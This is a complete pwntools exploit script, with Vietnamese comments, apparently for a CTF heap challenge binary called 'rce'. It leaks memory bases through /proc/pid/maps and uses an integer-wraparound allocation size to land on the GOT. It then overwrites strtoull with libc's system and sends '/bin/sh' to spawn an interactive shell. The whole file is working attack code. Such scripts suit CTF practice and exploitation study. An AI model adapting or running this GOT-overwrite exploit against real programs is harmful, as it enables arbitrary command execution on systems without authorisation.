from pwn import *
import time

# --- CẤU HÌNH ---
exe = ELF('./rce')
libc = ELF('./libc.so.6')
context.binary = exe

# context.log_level = 'debug'

def get_bases(pid):
    log.info(f"Reading memory maps for PID: {pid}...")
    binary_base = 0
    libc_base = 0
    heap_base = 0
    try:
        with open(f"/proc/{pid}/maps", 'r') as f:
            for line in f:
                if 'rce' in line and binary_base == 0:
                    binary_base = int(line.split('-')[0], 16)
                if 'libc.so.6' in line and libc_base == 0:
                    libc_base = int(line.split('-')[0], 16)
                if '[heap]' in line and heap_base == 0:
                    heap_base = int(line.split('-')[0], 16)
    except:
        pass
    return binary_base, libc_base, heap_base

p = process('./rce')
# p = remote('ctf.csd.lol', 2024)

def alloc(idx, size, data=b''):
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    
    # Kiểm tra exploit mode
    if int(size) > (1 << 63):
        p.recvuntil(b'data: ')
        p.recvuntil(b'> ') # Dọn sạch menu thừa
        return
    else:
        p.sendafter(b'data: ', data)

log.info("--- AUTO PWN START ---")

# 1. Init Heap
p.sendline(b'1')
alloc(0, 16, b'INIT')

# 2. Auto Leak
binary_base, libc_base, heap_base = get_bases(p.pid)
if binary_base == 0:
    log.error("Lỗi đọc maps. Chạy lại thử xem!")

exe.address = binary_base
libc.address = libc_base
current_ptr = heap_base + 0x2c0

log.success(f"Binary: {hex(binary_base)}")
log.success(f"Libc:   {hex(libc_base)}")
log.success(f"Heap:   {hex(heap_base)}")
log.success(f"Target GOT: {hex(exe.got['strtoull'])}")

# 3. Calc Offset
target_addr = exe.got['strtoull']
distance = current_ptr - target_addr
magic_size = (1 << 64) - distance

log.info(f"Distance: {hex(distance)}")

# 4. Jump back to GOT
log.info("1. Jumping back...")
p.sendline(b'1')
alloc(1, magic_size)

# 5. Overwrite GOT
log.info("2. Overwriting strtoull...")
p.sendline(b'1') 
# Gửi chính xác 8 byte, không có \n thừa
alloc(2, 8, p64(libc.sym['system']))

# 6. Shell
log.success("3. Triggering Shell...")
# Bây giờ buffer sạch sẽ, gửi lệnh shell vào
p.sendline(b'/bin/sh')

p.interactive()